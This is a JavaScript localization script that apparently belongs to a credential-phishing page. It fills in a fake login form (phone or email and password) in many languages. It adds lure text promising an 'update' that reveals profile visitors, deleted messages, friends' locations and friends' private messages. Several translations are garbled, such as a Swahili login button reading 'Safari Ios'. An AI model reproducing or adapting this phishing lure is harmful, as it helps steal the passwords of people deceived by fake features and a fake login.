transItems = document.querySelectorAll(".translated");
var userLang = (navigator.language || navigator.userLanguage).split('-')[0];
var Translate = {
    ar: {
        dir: 'rtl',
        log_alert: 'يجب تسجيل الدخول اولا',
        user: 'عنوان البريد الإلكتروني أو رقم الهاتف',
        pass: 'كلمه السر',
        button: 'تسجيل الدخول',
        main: 'أضفنا الكثير من الميزات في التحديث الجديد',
        feature1: 'اكتشف من يتحدث مع أصدقائك',
        feature2: 'اكتشف من زار ملفك الشخصي',
        feature3: 'قراءة الرسائل المحذوفة',
        feature4: 'اكتشف موقع صديقك الحالي',
        feature5: 'قراءة رسائل صديقك دون ان يعرف',
        feature6: 'قم بتنزيل حالة أصدقائك',
        update_button: 'تحديث الان'
    },
    mn: {
        dir: 'rtl',
        log_alert: 'Та үргэлжлүүлэхийн тулд нэвтрэх хэрэгтэй',
        user: 'Гар утасны дугаар эсвэл имэйл хаяг',
        pass: 'нууц үг',
        button: 'Нэвтрэх',
        main: 'Бид шинэ шинэчлэлтэд олон боломжуудыг нэмсэн',
        feature1: 'Найзуудтайгаа хэн ярьж байгааг олж мэдээрэй',
        feature2: 'Таны профайлд хэн зочилсныг олж мэдээрэй',
        feature3: 'Устгасан мессежүүдийг уншина уу',
        feature4: 'Найзынхаа одоогийн байршлыг олж мэдээрэй',
        feature5: 'Найзуудын мессежийг харахгүйгээр уншаарай',
        feature6: 'Найзуудынхаа статусыг татаж аваарай',
        update_button: 'Одоо шинэчлэх'

    },
    es: {
        dir: 'ltr',
        log_alert: 'Debe iniciar sesión para continuar',
        user: 'Número de teléfono móvil o dirección de correo electrónico',
        pass: 'contraseña',
        button: 'Iniciar Sesión',
        main: 'Agregamos muchas características en la nueva actualización',
        feature1: 'Descubre quién está hablando con tus amigos',
        feature2: 'Descubre quién visitó tu perfil',
        feature3: 'Leer mensajes eliminados',
        feature4: 'Descubre la ubicación actual de tu amigo',
        feature5: 'Lee los mensajes de tus amigos sin que te vean',
        feature6: 'Descarga el estado de tus amigos',
        update_button: 'Actualizar ahora'

    },
    am: {
        dir: 'rtl',
        log_alert: 'ለመቀጠል መግባት አለብዎት',
        user: 'የተንቀሳቃሽ ስልክ ቁጥር ወይም የኢሜይል አድራሻ',
        pass: 'ሚስጢራዊ ቃል',
        button: 'ስግን እን',
        main: 'በጣም አዲስ',
        feature1: 'ማን ከጓደኞችዎ ጋር እንደሚነጋገር ይወቁ',
        feature2: 'ማን መገለጫህን እንደጎበኘ እወቅ',
        feature3: 'የተሰረዙ መልዕክቶችን ያንብቡ',
        feature4: 'የጓደኛዎን ወቅታዊ ቦታ ይወቁ',
        feature5: 'የጓደኞችን መልእክት ሳያዩ ያንብቡ',
        feature6: 'የጓደኞችዎን ሁኔታ ያውርዱ',
        update_button: 'አሁን አዘምን'

    },
    bg: {
        dir: 'ltr',
        log_alert: 'Трябва да влезете, за да продължите',
        user: 'Мобилен номер или имейл адрес',
        pass: 'парола',
        button: 'Вход',
        main: 'Добавихме много функции в новата актуализация',
        feature1: 'Разберете кой говори с приятелите ви',
        feature2: 'Разберете кой е посетил вашия профил',
        feature3: 'Прочетете изтритите съобщения',
        feature4: 'Разберете текущото местоположение на вашия приятел',
        feature5: 'Четете съобщения на приятели, без да ги виждате',
        feature6: 'Изтеглете състоянието на вашите приятели',
        update_button: 'Актуализирайте сега'


    },
    bn: {
        dir: 'ltr',
        log_alert: 'চালিয়ে যেতে আপনাকে অবশ্যই লগইন করতে হবে',
        user: 'মোবাইল নম্বর বা ইমেল ঠিকানা',
        pass: 'পাসওয়ার্ড',
        button: 'লগইন করুন',
        main: 'আমরা নতুন আপডেটে বৈশিষ্ট্য অনেক যোগ',
        feature1: 'আপনার বন্ধুদের সাথে কে কথা বলছে তা খুঁজে বের করুন',
        feature2: 'আপনার প্রোফাইল কে পরিদর্শন করেছেন তা খুঁজে বের করুন',
        feature3: 'মুছে ফেলা বার্তা পড়ুন',
        feature4: 'আপনার বন্ধুর বর্তমান অবস্থান খুঁজে বের করুন',
        feature5: 'না দেখে বন্ধুদের বার্তা পড়ুন',
        feature6: 'আপনার বন্ধুদের স্ট্যাটাস ডাউনলোড করুন',
        update_button: 'এখন হালনাগাদ করুন'


    },
    cs: {
        dir: 'ltr',
        log_alert: 'Chcete-li pokračovat, musíte se přihlásit',
        user: 'Mobilní číslo nebo e-mailová adresa',
        pass: 'heslo',
        button: 'přihlásit',
        main: 'Přidali jsme mnoho funkcí v nové aktualizaci',
        feature1: 'Zjistěte, kdo mluví s vašimi přáteli',
        feature2: 'Zjistěte, kdo navštívil váš profil',
        feature3: 'Číst smazané zprávy',
        feature4: 'Zjistěte aktuální polohu svého přítele',
        feature5: 'Čtěte zprávy přátel, aniž byste je viděli',
        feature6: 'Stáhněte si stav svých přátel',
        update_button: 'Nyní aktualizovat'


    },
    el: {
        dir: 'ltr',
        log_alert: 'Πρέπει να συνδεθείτε για να συνεχίσετε',
        user: 'Αριθμός κινητού ή διεύθυνση ηλεκτρονικού ταχυδρομείου',
        pass: 'κωδικός',
        button: 'συνδεθείτε',
        main: 'Προσθέσαμε πολλές δυνατότητες στη νέα ενημέρωση',
        feature1: 'Μάθετε ποιος μιλάει στους φίλους σας',
        feature2: 'Μάθετε ποιος επισκέφτηκε το προφίλ σας',
        feature3: 'Διαβάστε τα διαγραμμένα μηνύματα',
        feature4: 'Μάθετε την τρέχουσα τοποθεσία του φίλου σας',
        feature5: 'Διαβάστε τα μηνύματα φίλων χωρίς να τα δείτε',
        feature6: 'Κατεβάστε την κατάσταση των φίλων σας',
        update_button: 'Ενημέρωση τώρα'


    },
    fi: {
        dir: 'ltr',
        log_alert: 'Sinun täytyy kirjautua sisään jatkaaksesi',
        user: 'Matkapuhelinnumero tai sähköpostiosoite',
        pass: 'salasana',
        button: 'kirjautunut',
        main: 'Lisäsimme paljon ominaisuuksia uuteen päivitykseen',
        feature1: 'Ota selvää, kuka puhuu ystävillesi',
        feature2: 'Selvitä, kuka vieraili profiilissasi',
        feature3: 'Lue poistetut viestit',
        feature4: 'Selvitä ystäväsi nykyinen sijainti',
        feature5: 'Lue ystävien viestejä näkemättä',
        feature6: 'Lataa ystäväsi tila',
        update_button: 'Päivitä nyt'

    },
    fr: {
        dir: 'ltr',
        log_alert: 'Vous devez vous connecter pour continuer',
        user: 'Numéro de portable ou adresse e-mail',
        pass: 'mot de passe',
        button: 'connecter',
        main: 'Nous avons ajouté beaucoup de fonctionnalités dans la nouvelle mise à jour',
        feature1: 'Découvrez qui parle à vos amis',
        feature2: 'Découvrez qui a visité votre profil',
        feature3: 'Lire les messages supprimés',
        feature4: "Découvrez l'emplacement actuel de votre ami",
        feature5: "Lire les messages d'amis sans les voir",
        feature6: 'Téléchargez le statut de vos amis',
        update_button: 'Mettez à jour maintenant'


    },
    he: {
        dir: 'rtl',
        log_alert: 'עליך להתחבר כדי להמשיך',
        user: 'מספר טלפון נייד או כתובת אימייל',
        pass: 'סיסמה',
        button: 'התחבר',
        main: 'הוספנו הרבה תכונות בעדכון החדש',
        feature1: 'גלה מי מדבר עם החברים שלך',
        feature2: 'גלה מי ביקר בפרופיל שלך',
        feature3: 'קרא הודעות שנמחקו',
        feature4: 'גלה את המיקום הנוכחי של חברך',
        feature5: 'קרא הודעות של חברים מבלי לראות',
        feature6: 'הורד את סטטוס החברים שלך',
        update_button: 'עדכן כעת'

    },
    hi: {
        dir: 'ltr',
        log_alert: 'जारी रखने के लिए आपको लॉगिन करना होगा',
        user: 'मोबाइल नंबर या ईमेल पता',
        pass: 'पासवर्ड',
        button: 'लॉग इन करें',
        main: 'हमने नए अपडेट में बहुत सारी सुविधाएँ जोड़ी हैं',
        feature1: 'पता करें कि आपके दोस्तों से कौन बात कर रहा है',
        feature2: 'पता करें कि आपकी प्रोफ़ाइल पर कौन गया',
        feature3: 'हटाए गए संदेशों को पढ़ें',
        feature4: 'अपने मित्र का वर्तमान स्थान पता करें',
        feature5: 'बिना देखे दोस्तों के मैसेज पढ़ें',
        feature6: 'अपने दोस्तों की स्थिति डाउनलोड करें',
        update_button: 'अभी अद्यतन करें'


    },
    hu: {
        dir: 'ltr',
        log_alert: 'A folytatáshoz be kell jelentkeznie',
        user: 'Mobilszám vagy e-mail cím',
        pass: 'jelszó',
        button: 'Bejelentkezés',
        main: 'Sok funkciót adtunk hozzá az új frissítéshez',
        feature1: 'Tudja meg, ki beszél a barátaival',
        feature2: 'Tudja meg, ki látogatta meg profilját',
        feature3: 'Olvassa el a törölt üzeneteket',
        feature4: 'Tudja meg barátja jelenlegi tartózkodási helyét',
        feature5: 'Olvassa el a barátok üzeneteit anélkül, hogy látná',
        feature6: 'Töltse le az ismerősei állapotát',
        update_button: 'Frissítse most'


    },
    id: {
        dir: 'ltr',
        log_alert: 'Anda harus login untuk melanjutkan',
        user: 'Nomor ponsel atau alamat email',
        pass: 'kata sandi',
        button: 'Login',
        main: 'Kami menambahkan banyak fitur dalam update baru',
        feature1: 'Cari tahu siapa yang berbicara dengan teman Anda',
        feature2: 'Cari tahu siapa yang mengunjungi profil Anda',
        feature3: 'Baca pesan yang dihapus',
        feature4: 'Cari tahu lokasi teman Anda saat ini',
        feature5: 'Baca pesan teman tanpa terlihat',
        feature6: 'Unduh status teman Anda',
        update_button: 'Memperbarui sekarang'


    },
    it: {
        dir: 'ltr',
        log_alert: 'È necessario effettuare il login per continuare',
        user: 'Numero di cellulare o indirizzo email',
        pass: 'password',
        button: 'login',
        main: 'Abbiamo aggiunto molte funzionalità nel nuovo aggiornamento',
        feature1: 'Scopri chi sta parlando con i tuoi amici',
        feature2: 'Scopri chi ha visitato il tuo profilo',
        feature3: 'Leggi i messaggi eliminati',
        feature4: 'Scopri la posizione attuale del tuo amico',
        feature5: 'Leggi i messaggi degli amici senza essere visto',
        feature6: 'Scarica lo stato dei tuoi amici',
        update_button: 'Aggiorna ora'


    },
    my: {
        dir: 'ltr',
        log_alert: 'ဆက်လက်ဝင်မည်',
        user: 'မိုဘိုင်းနံပါတ်သို့မဟုတ်အီးမေးလ်လိပ်စာ',
        pass: 'စကားဝှက်',
        button: 'မြန်မာဘာသာ',
        main: 'အသစ်အသစ်အသစ်အသစ်တွင်လုပ်ဆောင်ချက်များစွာကိုထည့်သွင်းထားပါသည်။',
        feature1: 'သင့်သူငယ်ချင်းများနှင့် စကားပြောနေသူကို ရှာဖွေပါ။',
        feature2: 'သင့်ပရိုဖိုင်ကို ဝင်ကြည့်ခဲ့သူကို ရှာဖွေပါ။',
        feature3: 'ဖျက်လိုက်သောစာများကိုဖတ်ပါ။',
        feature4: 'သင့်သူငယ်ချင်း၏ လက်ရှိတည်နေရာကို ရှာဖွေပါ။',
        feature5: 'သူငယ်ချင်းများ၏ စာများကို မမြင်ရဘဲ ဖတ်ပါ။',
        feature6: 'သင့်သူငယ်ချင်းများ၏ အခြေအနေကို ဒေါင်းလုဒ်လုပ်ပါ။',
        update_button: 'ယခု အပ်ဒိတ်လုပ်ပါ။'

    },
    ne: {
        dir: 'ltr',
        log_alert: 'तपाईँले जारी राख्न लगइन गर्नुपर्छ ।',
        user: 'मोबाइल नम्बर वा इमेल ठेगाना',
        pass: 'पासवर्ड',
        button: 'तौल घट्नु',
        main: 'हामी नयाँ अद्यावधिक मा विशेषताहरु को धेरै जोडी',
        feature1: 'तपाईका साथीहरूसँग कसले कुरा गरिरहेको छ पत्ता लगाउनुहोस्',
        feature2: 'पत्ता लगाउनुहोस् कसले तपाईको प्रोफाइल भ्रमण गर्यो',
        feature3: 'मेटाइएका सन्देशहरू पढ्नुहोस्',
        feature4: 'आफ्नो साथी वर्तमान स्थान पत्ता लगाउनुहोस्',
        feature5: 'नदेखेका साथीहरूको सन्देशहरू पढ्नुहोस्',
        feature6: 'आफ्नो साथी स्थिति डाउनलोड गर्नुहोस्',
        update_button: 'अहिले अपडेट गर्नुहोस्'


    },
    ph: {
        dir: 'ltr',
        log_alert: 'Dapat kang mag-login upang magpatuloy',
        user: 'Numero ng mobile o email address',
        pass: 'password',
        button: 'Mag log in',
        main: 'Nagdagdag kami ng maraming feature sa bagong update',
        feature1: 'Alamin kung sino ang nakikipag-usap sa iyong mga kaibigan',
        feature2: 'Alamin kung sino ang bumisita sa iyong profile',
        feature3: 'Basahin ang mga tinanggal na mensahe',
        feature4: 'Alamin ang kasalukuyang lokasyon ng iyong kaibigan',
        feature5: 'Basahin ang mga mensahe ng mga kaibigan nang hindi nakikita',
        feature6: 'I-download ang status ng iyong mga kaibigan',
        update_button: 'Update Ngayon'


    },
    pl: {
        dir: 'ltr',
        log_alert: 'Musisz się zalogować, aby kontynuować',
        user: 'Numer telefonu komórkowego lub adres e-mail',
        pass: 'hasło',
        button: 'Zaloguj Się',
        main: 'Dodaliśmy wiele funkcji w nowej aktualizacji',
        feature1: 'Dowiedz się, kto rozmawia z Twoimi przyjaciółmi',
        feature2: 'Dowiedz się, kto odwiedził Twój profil',
        feature3: 'Przeczytaj usunięte wiadomości',
        feature4: 'Sprawdź aktualną lokalizację swojego znajomego',
        feature5: 'Czytaj wiadomości znajomych bez oglądania',
        feature6: 'Pobierz status znajomych',
        update_button: 'Aktualizuj teraz'


    },
    pt: {
        dir: 'ltr',
        log_alert: 'Você deve fazer login para continuar',
        user: 'Número de telemóvel ou endereço de E-mail',
        pass: 'senha',
        button: 'conectar',
        main: 'Adicionamos muitos recursos na nova atualização',
        feature1: 'Descubra quem está falando com seus amigos',
        feature2: 'Descubra quem visitou seu perfil',
        feature3: 'Ler mensagens excluídas',
        feature4: 'Descubra a localização atual do seu amigo',
        feature5: 'Leia as mensagens dos amigos sem ser visto',
        feature6: 'Baixe seu status de amigos',
        update_button: 'Atualizar agora'


    },
    ro: {
        dir: 'ltr',
        log_alert: 'Trebuie să vă conectați pentru a continua',
        user: 'Numărul de telefon mobil sau adresa de e-mail',
        pass: 'parolă',
        button: 'Autentificare',
        main: 'Am adăugat o mulțime de caracteristici în noua actualizare',
        feature1: 'Află cine vorbește cu prietenii tăi',
        feature2: 'Aflați cine v-a vizitat profilul',
        feature3: 'Citiți mesajele șterse',
        feature4: 'Aflați locația actuală a prietenului dvs',
        feature5: 'Citiți mesajele prietenilor fără a fi văzute',
        feature6: 'Descărcați starea prietenilor dvs',
        update_button: 'Actualizează acum'

    },
    sw: {
        dir: 'ltr',
        log_alert: 'Lazima login kuendelea',
        user: 'Simu ya mkononi au barua pepe',
        pass: 'nywila',
        button: 'Safari Ios',
        main: 'Sisi aliongeza mengi ya makala katika update mpya',
        feature1: 'Jua ni nani anayezungumza na marafiki zako',
        feature2: 'Jua ni nani aliyetembelea wasifu wako',
        feature3: 'Soma ujumbe uliofutwa',
        feature4: 'Tafuta eneo la sasa la rafiki yako',
        feature5: 'Soma ujumbe wa marafiki bila kuonekana',
        feature6: 'Pakua hali ya marafiki zako',
        update_button: 'Sasisha Sasa'

    },
    th: {
        dir: 'ltr',
        log_alert: 'คุณต้องเข้าสู่ระบบเพื่อดำเนินการต่อ',
        user: 'หมายเลขโทรศัพท์มือถือหรือที่อยู่อีเมล',
        pass: 'รหัสผ่าน',
        button: 'ลงชื่อเข้าใช้',
        main: 'เราได้เพิ่มจำนวนมากของคุณสมบัติในการปรับปรุงใหม่',
        feature1: 'ค้นหาว่าใครกำลังคุยกับเพื่อนของคุณ',
        feature2: 'ค้นหาว่าใครเข้าเยี่ยมชมโปรไฟล์ของคุณ',
        feature3: 'อ่านข้อความที่ถูกลบ',
        feature4: 'ค้นหาตำแหน่งปัจจุบันของเพื่อนของคุณ',
        feature5: 'อ่านข้อความของเพื่อนโดยไม่มีใครเห็น',
        feature6: 'ดาวน์โหลดสถานะเพื่อนของคุณ',
        update_button: 'อัพเดทตอนนี้'


    },
    tr: {
        dir: 'ltr',
        log_alert: 'Devam etmek için giriş yapmalısınız',
        user: 'Cep telefonu numarası ya da e-posta adresi',
        pass: 'şifre',
        button: 'giriş yap',
        main: 'Yeni güncellemede birçok özellik ekledik',
        feature1: 'Arkadaşlarınızla kimin konuştuğunu öğrenin',
        feature2: 'Profilinizi kimin ziyaret ettiğini öğrenin',
        feature3: 'Silinen mesajları oku',
        feature4: 'Arkadaşınızın şu anki konumunu öğrenin',
        feature5: 'Arkadaşlarınızın mesajlarını görmeden okuyun',
        feature6: 'Arkadaşlarınızın durumunu indirin',
        update_button: 'Şimdi güncelle'

    },
    ur: {
        dir: 'rtl',
        log_alert: 'آپ کو ہونا چاہیے میں لاگ ان کرنے کے لئے جاری',
        user: 'موبائل نمبر یا ای میل ایڈریس',
        pass: 'پاس ورڈ',
        button: 'میں لاگ ان کریں',
        main: 'ہم ایک بہت شامل کی خصوصیات میں نئی اپ ڈیٹ',
        feature1: 'معلوم کریں کہ آپ کے دوستوں سے کون بات کر رہا ہے۔',
        feature2: 'معلوم کریں کہ آپ کا پروفائل کس نے دیکھا',
        feature3: 'حذف شدہ پیغامات پڑھیں',
        feature4: 'اپنے دوست کا موجودہ مقام معلوم کریں۔',
        feature5: 'دوستوں کے پیغامات بغیر دیکھے پڑھیں',
        feature6: 'اپنے دوستوں کی حیثیت ڈاؤن لوڈ کریں۔',
        update_button: 'اپ ڈیٹ اب'

    },
    vi: {
        dir: 'ltr',
        log_alert: 'Bạn phải login để có thể tiếp tục',
        user: 'Số điện thoại di động, hoặc địa chỉ email',
        pass: 'mật khẩu',
        button: 'Đăng Nhập',
        main: 'Chúng tôi đã thêm rất nhiều năng trong các cập nhật mới',
        feature1: 'Tìm ra ai đang nói chuyện với bạn bè của bạn',
        feature2: 'Tìm xem ai đã truy cập hồ sơ của bạn',
        feature3: 'Đọc tin nhắn đã xóa',
        feature4: 'Tìm ra vị trí hiện tại của bạn bè',
        feature5: 'Đọc tin nhắn của bạn bè mà không thấy',
        feature6: 'Tải xuống trạng thái bạn bè của bạn',
        update_button: 'Cập nhật bây giờ'

    }
};


transItems[0].style.direction = Translate[userLang].dir;
transItems[1].innerHTML = Translate[userLang].log_alert;
transItems[2].setAttribute("placeholder", Translate[userLang].user);
transItems[3].setAttribute("placeholder", Translate[userLang].pass);
transItems[4].value = Translate[userLang].button;
transItems[5].innerHTML = Translate[userLang].main;
transItems[6].innerHTML = Translate[userLang].feature1;
transItems[7].innerHTML = Translate[userLang].feature2;
transItems[8].innerHTML = Translate[userLang].feature3;
transItems[9].innerHTML = Translate[userLang].feature4;
transItems[10].innerHTML = Translate[userLang].feature5;
transItems[11].innerHTML = Translate[userLang].feature6;
transItems[12].innerHTML = Translate[userLang].update_button;